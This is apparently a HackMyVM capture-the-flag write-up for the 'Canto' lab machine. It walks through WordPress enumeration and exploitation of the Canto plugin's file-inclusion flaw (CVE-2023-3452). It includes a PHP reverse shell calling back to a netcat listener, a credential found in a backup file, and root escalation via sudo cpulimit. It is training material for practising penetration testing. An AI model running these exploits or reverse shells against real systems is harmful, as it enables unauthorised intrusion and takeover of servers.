# Canto — HackMyVM Writeup
 
Welcome to the **Canto** writeup! In this machine we cover the full hacking cycle:
 
- Reconnaissance
- Exploiting a vulnerable WordPress plugin
- Lateral movement via a password left in a backup file
- Privilege escalation
---
 
## 1. Reconnaissance
 
First we need to check our own IP address and then the IP address of the target machine.
 
To confirm our IP address, we run `ip a`:
 
```
eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
inet 192.168.0.13/24
```
 
Then, with `sudo arp-scan`, we find the IP address of the machine we'll be attacking:
 
```
┌──(r4v3x㉿kali)-[~/Desktop]
└─$ sudo arp-scan -I eth0 --localnet
192.168.0.15    08:00:27:87:dc:08       PCS Systemtechnik GmbH
```
 
Once we have the target's IP, we run an `nmap` scan to check for open ports and get an idea of where to focus the attack:
 
```
┌──(r4v3x㉿kali)-[~/Desktop]
└─$ sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -n -Pn -vvv 192.168.0.15 -oN results.txt
Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-05 19:56 -0500
...
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.3p1 Ubuntu 1ubuntu3.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 c6:af:18:21:fa:3f:3c:fc:9f:e4:ef:04:c9:16:cb:c7 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKkMLZHCokv5rpKTUUfitgdTSiyieZXC1kqsQS8DEnLgk6x5fOmlzHim2qgiwoJhyEJa7Nj1k3K6pwm5RVxEjEU=
|   256 ba:0e:8f:0b:24:20:dc:75:b7:1b:04:a1:81:b6:6d:64 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDR8+o8qabpIHzS2zgBZDxfX0Tm5eWBBstEt5QeYN04+
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.57 ((Ubuntu))
|_http-generator: WordPress 7.1.4
|_http-title: Canto
|_http-server-header: Apache/2.4.57 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
MAC Address: 08:00:27:87:DC:08 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
Nmap done: 1 IP address (1 host up) scanned in 73.18 seconds
Raw packets sent: 123607 (5.439MB) | Rcvd: 13709 (548.364KB)
```
 
As we can see, there's a WordPress website running, along with TCP port 22 (SSH) and TCP port 80 (HTTP) open.
 
It's time to visit the website.
 
---
 
## 2. Enumeration
 
<img width="1345" height="598" alt="image" src="https://github.com/user-attachments/assets/1b4b8524-e8b8-4972-b183-60921f656dca" />
As you can see, we have a Canto website running on WordPress.
 
Most WordPress sites have a login page, which we can confirm by appending `wp-login.php` to the URL. This leads us to the WordPress login page:
 
<img width="1267" height="580" alt="image" src="https://github.com/user-attachments/assets/7e914cc2-a0ad-4a90-bc1c-9afb0a589798" />
WordPress has something interesting: it will always tell you whether a username is registered or not, and separately whether the password is incorrect — this gives us a significant advantage. For example, if we try a made-up username with a random password, we can confirm the user is *not* registered:
 
<img width="764" height="503" alt="image" src="https://github.com/user-attachments/assets/7e7f07f1-7e2f-4cb5-909a-13c307b05fee" />
### Username Enumeration
 
To enumerate valid users, we use **WPScan**. This gives us an idea of possible usernames and where to focus the attack:
 
```
┌──(r4v3x㉿kali)-[~/Desktop]
└─$ wpscan --url 'http://192.168.0.15/' -e u,p
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
 
                  WordPress Security Scanner
                         Version 4.1.0
_______________________________________________________________
 
[+] URL: http://192.168.0.15/ [192.168.0.15]
[+] Started: Thu Nov  5 20:27:10 2026
 
[+] erik
 | Found By: Rss Generator (Passive Detection)
[i] 1 user(s) Identified.
[+] Finished: Thu Nov  5 20:27:23 2026
```
 
We found `erik` as a user. If we go back to the WordPress login page and try `erik` with a random password, we get a different error message — this time telling us the password is incorrect. That confirms `erik` is a registered user on this site:
 
<img width="601" height="503" alt="image" src="https://github.com/user-attachments/assets/a2b3e833-ba89-42a0-af69-90f97daf608c" />
### Directory Enumeration
 
Now it's time to enumerate the website's directories using **Gobuster**:
 
```
┌──(r4v3x㉿kali)-[~/Desktop]
└─$ gobuster dir -u http://192.168.0.15/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.0.15/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
wp-content           (Status: 301) [Size: 317] [--> http://192.168.0.15/wp-content/]
wp-includes          (Status: 301) [Size: 318] [--> http://192.168.0.15/wp-includes/]
wp-admin             (Status: 301) [Size: 315] [--> http://192.168.0.15/wp-admin/]
server-status        (Status: 403) [Size: 277]
Progress: 104810 / 220558 (47.52%)^C
```
 
Let's try `wp-content` — if it exists, we won't get a 404 error. And it does exist:
 
<img width="1058" height="456" alt="image" src="https://github.com/user-attachments/assets/88536a7b-b729-43f3-b4fa-0bfd2d6dcf74" />
As shown above, there's no error on this directory. You could also try the others, but for this walkthrough I'll be using this one.
 
### Plugin Enumeration
 
Before going further, we download a WordPress plugin-name wordlist. Visit the [WordPress-Plugins-List](https://github.com/Perfectdotexe/WordPress-Plugins-List) repository on GitHub, open `plugins.txt`, and copy the **Raw** file URL:
 
```
┌──(r4v3x㉿kali)-[~/Desktop]
└─$ wget https://raw.githubusercontent.com/Perfectdotexe/WordPress-Plugins-List/refs/heads/master/plugins.txt
```
 
With the wordlist saved, we first run a general directory scan to confirm the website exposes a reachable plugins path:
 
```
gobuster dir -u 'http://192.168.0.15/' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```
 
This confirms the plugins directory is reachable. Next, we use WPScan to find installed plugins — keep in mind that most WordPress attacks come from vulnerable plugins:
 
```
┌──(r4v3x㉿kali)-[~/Desktop]
└─$ wpscan --url 'http://192.168.0.15/' -e ap --plugins-detection aggressive
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
 
                  WordPress Security Scanner
                         Version 4.1.0
_______________________________________________________________
 
[+] URL: http://192.168.0.15/ [192.168.0.15]
[+] Started: Thu Nov  5 20:46:52 2026
 
Interesting Finding(s):
 
[+] Headers
 | Interesting Entry: Server: Apache/2.4.57 (Ubuntu)
 
[+] XML-RPC seems to be enabled: http://192.168.0.15/xmlrpc.php
[+] WordPress readme found: http://192.168.0.15/readme.html
[+] Upload directory has listing enabled: http://192.168.0.15/wp-content/uploads/
[+] The external WP-Cron seems to be enabled: http://192.168.0.15/wp-cron.php
 
[+] WordPress version 7.1.4 identified (Latest, released on 2026-10-28).
 
[+] WordPress theme in use: twentytwentyfour
 | Location: http://192.168.0.15/wp-content/themes/twentytwentyfour/
 | Version: 1.1 (80% confidence)
 
[+] Enumerating All Plugins (via Aggressive Methods)
 
[+] akismet
 | Location: http://192.168.0.15/wp-content/plugins/akismet/
 | Version: 5.3.2 (100% confidence)
 
[+] canto
 | Location: http://192.168.0.15/wp-content/plugins/canto/
 | Version: 3.0.4 (100% confidence)
 
[+] https://github.com/placetopay/woocommerce-gateway-placetopay
 | Location: http://192.168.0.15/wp-content/plugins/https://github.com/placetopay/woocommerce-gateway-placetopay/
 
Checking Known Locations - Time: 00:07:20 <===> (137216 / 137216) 100.00%
[i] 3 plugin(s) Identified.
[+] Finished: Thu Nov  5 20:54:29 2026
```
 
As shown above, we find two relevant plugins: **Akismet** and **Canto** — I'll be using `canto`, since it also happens to be the name of this machine.
 
Let's confirm the path WPScan gave us by visiting it directly:
 
`http://192.168.0.15/wp-content/plugins/canto/`
 
No 404 error — it works!
 
<img width="1144" height="308" alt="image" src="https://github.com/user-attachments/assets/43701a25-937b-4622-88a1-b9201e8ed90a" />
---
 
## 3. Exploitation
 
Now we need to check the installed version of the Canto plugin to look for known vulnerabilities. Our detected version is **3.0.4**, so we search Google/GitHub for a matching exploit.
 
The most relevant result was this one:
 
<img width="1259" height="507" alt="image" src="https://github.com/user-attachments/assets/2771ff10-05b7-4660-b7a2-283067765f96" />
This exploit targets a function in the Canto plugin that downloads/includes a PHP file via a `wp_abspath` parameter, without validating the local WordPress path. The vulnerable code lives in `includes/lib/download.php`.
 
### Step 1 — Clone the exploit repo
 
```
┌──(r4v3x㉿kali)-[~/Desktop]
└─$ git clone https://github.com/leoanggal1/CVE-2023-3452-PoC
Cloning into 'CVE-2023-3452-PoC'...
remote: Enumerating objects: 88, done.
remote: Counting objects: 100% (88/88), done.
remote: Compressing objects: 100% (87/87), done.
remote: Total 88 (delta 26), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (88/88), 199.77 KiB | 659.00 KiB/s, done.
Resolving deltas: 100% (26/26), done.
```
 
### Step 2 — Explore the directory
 
```
┌──(r4v3x㉿kali)-[~/Desktop]
└─$ cd CVE-2023-3452-PoC
 
┌──(r4v3x㉿kali)-[~/Desktop/CVE-2023-3452-PoC]
└─$ ls
assets  CVE-2023-3452.py  README.md
```
 
### Step 3 — Prepare a PHP reverse shell
 
Next, we grab the **PentestMonkey** PHP reverse shell from its GitHub repository:
 
<img width="933" height="450" alt="image" src="https://github.com/user-attachments/assets/e3e45ee4-195a-4fbd-aca1-14e1f94c2154" />
<img width="985" height="463" alt="image" src="https://github.com/user-attachments/assets/76942492-7b51-44b9-8b6a-ebd8edb2e97a" />
We copy the full payload — once executed on the victim's server, it will grant us a connection back to our attacking machine.
 
We create a file named `Virus_Total.php` (just an example name), paste the code in, and update it with our attacker's IP address:
 
<img width="1276" height="383" alt="image" src="https://github.com/user-attachments/assets/803be69f-1143-46d4-8825-ff9e80063e7e" />
We also set the listening port — in this example, port `443`. Then save and exit with `Ctrl + O`, `Enter`, `Ctrl + X`.
 
Before triggering the exploit, we start a listener:
 
```
sudo nc -nlvp 443
```
 
```
┌──(r4v3x㉿kali)-[~/Desktop/CVE-2023-3452-PoC]
└─$ sudo nc -nlvp 443
[sudo] password for r4v3x:
listening on [any] 443 ...
```
 
### Step 4 — Run the exploit
 
We run the exploit, pointing it to the target, our IP, our listening port, and our payload file:
 
```
python3 CVE-2023-3452.py -u http://192.168.0.15 -LHOST 192.168.0.13 -NC_PORT 443 -s Virus_Total.php
```
 
This first attempt didn't work, because the exploit's own local web server was also trying to use port `443`. To fix this, I edited the reverse shell file to use a different port (`447`) and pointed the exploit at that same port:
 
```
┌──(r4v3x㉿kali)-[~/Desktop/CVE-2023-3452-PoC]
└─$ python3 CVE-2023-3452.py -u http://192.168.0.15 -LHOST 192.168.0.13 -NC_PORT 447 -s Virus_Total.php
Local web server on port 8080...
Exploitation URL: http://192.168.0.15/wp-content/plugins/canto/includes/lib/download.php?wp_abspath=http://192.168.0.13:8080&cmd=whoami
listening on [any] 447 ...
192.168.0.15 - - [05/Nov/2026 22:30:24] "GET /wp-admin/admin.php HTTP/1.1" 200 -
192.168.0.15: inverse host lookup failed: Unknown host
connect to [192.168.0.13] from (UNKNOWN) [192.168.0.15] 58638
Linux canto 6.5.0-28-generic #29-Ubuntu SMP PREEMPT_DYNAMIC Thu Mar 28 23:46:48 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 03:30:24 up  2:50,  0 user,  load average: 0.12, 0.12, 0.09
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```
 
We confirm we have a shell as `www-data`:
 
```
$ whoami
www-data
$
```
 
---
 
## 4. Stabilizing the Shell
 
To get a stable, fully interactive STTY, we run:
 
```
script /dev/null -c bash
```
 
Then `Ctrl + Z` to background the shell, and from our Kali terminal:
 
```
┌──(r4v3x㉿kali)-[~/Desktop/CVE-2023-3452-PoC]
└─$ stty raw -echo; fg
```
 
This brings the shell back to the foreground with proper terminal handling. We then reset the terminal and set the environment variables:
 
```
reset xterm
www-data@canto:/$ export SHELL=bash
www-data@canto:/$ export TERM=xterm
www-data@canto:/$ whoami
www-data
www-data@canto:/$ ls
bin   cdrom  etc   lib    lost+found  mnt  proc  run   snap  sys  usr
boot  dev    home  lib64  media       opt  root  sbin  srv   tmp  var
www-data@canto:/$
```
 
---
 
## 5. Lateral Movement
 
We look for the user flag:
 
```
www-data@canto:/$ find / -name "user.txt" 2>/dev/null
/home/erik/user.txt
```
 
We're not allowed to read it directly, but we did find something else while poking around `erik`'s home directory:
 
```
www-data@canto:/$ cd home/erik
www-data@canto:/home/erik$ ls
notes  user.txt
www-data@canto:/home/erik$ cat user.txt
cat: user.txt: Permission denied
www-data@canto:/home/erik$ cd notes
www-data@canto:/home/erik/notes$ ls
Day1.txt  Day2.txt
www-data@canto:/home/erik/notes$ cat Day1.txt
On the first day I have updated some plugins and the website theme.
www-data@canto:/home/erik/notes$ cat Day2.txt
I almost lost the database with my user so I created a backups folder.
```
 
Those notes point us toward something called "backups," so we search for it:
 
```
www-data@canto:/home/erik/notes$ find / -name "backups" 2>/dev/null
/snap/core22/1380/var/backups
/snap/core22/864/var/backups
/var/backups
/var/wordpress/backups
```
 
Inside `/var/wordpress/backups`, we find a credentials file:
 
```
www-data@canto:/$ cd /var/wordpress/backups
www-data@canto:/var/wordpress/backups$ ls
12052024.txt
www-data@canto:/var/wordpress/backups$ cat 12052024.txt
------------------------------------
| Users     |      Password        |
------------|----------------------|
| erik      | th1sIsTheP3ssw0rd!   |
------------------------------------
```
 
Since this is a Linux machine, we use `su erik` with the password we just found to move laterally from `www-data` to `erik`:
 
```
www-data@canto:/var/wordpress/backups$ su erik
Password:
erik@canto:/var/wordpress/backups$ whoami
erik
```
 
Now let's grab the user flag from `erik`'s own account:
 
```
erik@canto:/var/wordpress/backups$ cd ~
erik@canto:~$ find / -name "user.txt" 2>/dev/null
/home/erik/user.txt
erik@canto:~$ ls
notes  user.txt
erik@canto:~$ cat user.txt
d41d8cd98f00b204e9800998ecf8427e
```
 
We did it. 🎉
 
---
 
## 6. Privilege Escalation
 
Now it's time to escalate to root. We start by checking our sudo permissions:
 
```
erik@canto:/$ sudo -l
Matching Defaults entries for erik on canto:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty
 
User erik may run the following commands on canto:
    (ALL : ALL) NOPASSWD: /usr/bin/cpulimit
```
 
We check [GTFOBins](https://gtfobins.github.io/gtfobins/cpulimit/) for `cpulimit`, and find a technique to escalate privileges from there:
 
<img width="1038" height="534" alt="image" src="https://github.com/user-attachments/assets/d9a4e6be-9ff0-40f5-9d4c-ab97529f136e" />
Bingo — we have root access:
 
<img width="760" height="214" alt="image" src="https://github.com/user-attachments/assets/a7880291-9710-4e16-9bfc-e466f1583a82" />
And with this, the **Canto** VM from HackMyVM is complete!
 
```
# whoami
root
# find / -name "root.txt" 2>/dev/null
/root/root.txt
# cd root
# ls
root.txt  snap
# cat root.txt
1b56eefaab2c896e57c874a635b24b49
```
 
---
 
## 🏁 Flags
 
| Flag | Location | Value |
|------|----------|-------|
| User | `/home/erik/user.txt` | `d41d8cd98f00b204e9800998ecf8427e` |
| Root | `/root/root.txt` | `1b56eefaab2c896e57c874a635b24b49` |
 
